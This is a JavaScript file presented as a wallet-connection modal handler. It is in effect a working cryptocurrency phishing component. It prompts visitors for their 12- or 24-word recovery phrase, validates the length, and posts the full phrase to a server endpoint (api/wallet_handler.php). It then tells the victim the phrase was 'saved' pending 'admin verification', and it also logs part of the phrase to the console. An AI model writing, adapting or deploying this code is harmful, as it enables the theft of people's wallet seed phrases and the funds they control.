/**
 * WALLET_MODAL.JS - Wallet Connection Modal Handler
 * Manages wallet connection modals with form validation
 * Unique namespace to avoid conflicts
 */

// Guard against multiple inclusions
if (typeof window.WalletModalHandler === 'undefined') {
window.WalletModalHandler = {
    /**
     * Initialize modal handler
     */
    init: function() {
        this.attachEventListeners();
    },

    /**
     * Open wallet modal with selected wallet
     * @param {string} walletName - Name of the wallet to connect
     */
    openWalletModal: function(walletName) {
        document.getElementById('walletName').value = walletName;
        document.getElementById('modalTitle').textContent = `Connect ${walletName}`;
        document.getElementById('walletModal').style.display = 'flex';
        document.getElementById('walletModal').style.visibility = 'visible';
        document.getElementById('walletModal').style.opacity = '1';
        document.getElementById('mnemonic').focus();
    },

    /**
     * Close wallet modal with animation
     */
    closeWalletModal: function() {
        const modal = document.getElementById('walletModal');
        modal.style.opacity = '0';
        setTimeout(() => {
            modal.style.visibility = 'hidden';
            modal.style.display = 'none';
        }, 300);
        
        // Reset form
        document.getElementById('connectForm').reset();
        document.getElementById('formError').style.display = 'none';
        document.getElementById('formSuccess').style.display = 'none';
        document.getElementById('wordCount').textContent = '0';
        document.getElementById('wordStatus').textContent = '';
    },

    /**
     * Close success modal and reload page
     */
    closeSuccessModal: function() {
        const modal = document.getElementById('successModal');
        modal.style.opacity = '0';
        setTimeout(() => {
            modal.style.visibility = 'hidden';
            modal.style.display = 'none';
            location.reload();
        }, 300);
    },

    /**
     * Show error message
     * @param {string} message - Error message to display
     */
    showError: function(message) {
        const errorDiv = document.getElementById('formError');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    },

    /**
     * Show success message
     * @param {string} message - Success message to display
     */
    showSuccess: function(message) {
        const successDiv = document.getElementById('formSuccess');
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        successDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    },

    /**
     * Handle form submission
     * @param {Event} event - Form submit event
     */
    handleWalletConnect: async function(event) {
        event.preventDefault();
        
        const mnemonic = document.getElementById('mnemonic').value.trim();
        const words = mnemonic.split(/\s+/).length;
        const walletName = document.getElementById('walletName').value;
        
        // Validation
        if (!mnemonic) {
            this.showError('Please enter your recovery phrase');
            return;
        }
        
        if (words !== 12 && words !== 24) {
            this.showError(`Invalid phrase length. Expected 12 or 24 words, got ${words}`);
            return;
        }
        
        // Show loading state
        const submitBtn = document.getElementById('submitBtn');
        const loader = submitBtn.querySelector('.wallet-btn-loader');
        submitBtn.disabled = true;
        loader.style.display = 'inline-block';
        
        try {
            // Collect all form data explicitly
            const formElement = document.getElementById('connectForm');
            const walletTokenField = formElement.querySelector('input[name="wallet_token"]');
            const walletNameField = formElement.querySelector('input[name="wallet_name"]');
            
            // Verify wallet_name is set
            if (!walletName) {
                this.showError('Wallet name not set. Please select a wallet again.');
                submitBtn.disabled = false;
                loader.style.display = 'none';
                return;
            }
            
            // Create FormData with explicit fields
            const formData = new FormData();
            formData.append('wallet_name', walletName);
            formData.append('mnemonic', mnemonic);
            formData.append('wallet_token', walletTokenField ? walletTokenField.value : '');
            
            // Debug: Log what we're sending
            console.log('Wallet Form Data being sent:');
            for (let [key, value] of formData) {
                console.log(`  ${key}: ${typeof value === 'string' ? value.substring(0, 50) : value}`);
            }
            
            const response = await fetch('api/wallet_handler.php', {
                method: 'POST',
                body: formData,
                credentials: 'same-origin'
            });
            
            // Debug: Log response status
            console.log('Wallet API Response Status:', response.status);
            
            // Parse response
            let result = {};
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                try {
                    result = await response.json();
                } catch (e) {
                    result = { success: false, message: 'Invalid JSON response' };
                }
            } else {
                result = { success: response.ok, message: await response.text() };
            }
            
            console.log('Wallet API Result:', result);
            
            // Check if request was successful
            if (result.success) {
                // Show success modal
                const successTitle = document.getElementById('successTitle');
                const successMessage = document.getElementById('successMessage');
                
                if (successTitle) successTitle.textContent = 'Wallet Connected!';
                if (successMessage) successMessage.textContent = result.message || 'Your wallet phrase has been saved successfully. Admin verification is pending.';
                
                const successModal = document.getElementById('successModal');
                successModal.style.display = 'flex';
                successModal.style.visibility = 'visible';
                setTimeout(() => {
                    successModal.style.opacity = '1';
                }, 10);
            } else {
                // Show error message from API
                const errorMsg = result.message || 'Failed to connect wallet. Please try again.';
                this.showError(errorMsg);
            }
            
        } catch (error) {
            console.error('Wallet connection error:', error);
            this.showError('Network error. Please check your connection and try again.');
        } finally {
            submitBtn.disabled = false;
            loader.style.display = 'none';
        }
    },

    /**
     * Update word count and validation status
     */
    updateWordCount: function() {
        const textarea = document.getElementById('mnemonic');
        const text = textarea.value.trim();
        const words = text.length > 0 ? text.split(/\s+/).length : 0;
        document.getElementById('wordCount').textContent = words;
        
        const status = document.getElementById('wordStatus');
        if (words === 12) {
            status.textContent = '✓ Valid (12 words)';
            status.className = 'wallet-word-status valid';
        } else if (words === 24) {
            status.textContent = '✓ Valid (24 words)';
            status.className = 'wallet-word-status valid';
        } else if (words > 0) {
            status.textContent = `${words} words (need 12 or 24)`;
            status.className = 'wallet-word-status invalid';
        } else {
            status.textContent = '';
            status.className = 'wallet-word-status';
        }
    },

    /**
     * Attach event listeners to modal elements
     */
    attachEventListeners: function() {
        const self = this;
        
        // Word count update
        const mnemonic = document.getElementById('mnemonic');
        if (mnemonic) {
            mnemonic.addEventListener('input', () => {
                self.updateWordCount();
            });
        }
        
        // Form submission
        const connectForm = document.getElementById('connectForm');
        if (connectForm) {
            connectForm.addEventListener('submit', (e) => {
                self.handleWalletConnect(e);
            });
        }
        
        // Close modal on overlay click (wallet modal)
        const walletModal = document.getElementById('walletModal');
        if (walletModal) {
            walletModal.addEventListener('click', function(e) {
                if (e.target === this) {
                    self.closeWalletModal();
                }
            });
        }
        
        // Close modal on overlay click (success modal)
        const successModal = document.getElementById('successModal');
        if (successModal) {
            successModal.addEventListener('click', function(e) {
                if (e.target === this) {
                    self.closeSuccessModal();
                }
            });
        }
        
        // Prevent closing when clicking inside modal
        const modalContainer = document.querySelector('.wallet-modal-container');
        if (modalContainer) {
            modalContainer.addEventListener('click', function(e) {
                e.stopPropagation();
            });
        }
    }
};

/**
 * Global wrapper functions for backward compatibility
 * These allow onclick handlers to work without changes
 */
function openWalletModal(walletName) {
    WalletModalHandler.openWalletModal(walletName);
}

function closeWalletModal() {
    WalletModalHandler.closeWalletModal();
}

function closeSuccessModal() {
    WalletModalHandler.closeSuccessModal();
}

function showError(message) {
    if (typeof window.WalletModalHandler !== 'undefined') {
        window.WalletModalHandler.showError(message);
    }
}

function showSuccess(message) {
    if (typeof window.WalletModalHandler !== 'undefined') {
        window.WalletModalHandler.showSuccess(message);
    }
}

// Initialize on DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        if (typeof window.WalletModalHandler !== 'undefined') {
            window.WalletModalHandler.init();
        }
    });
} else {
    if (typeof window.WalletModalHandler !== 'undefined') {
        window.WalletModalHandler.init();
    }
}
} // End guard
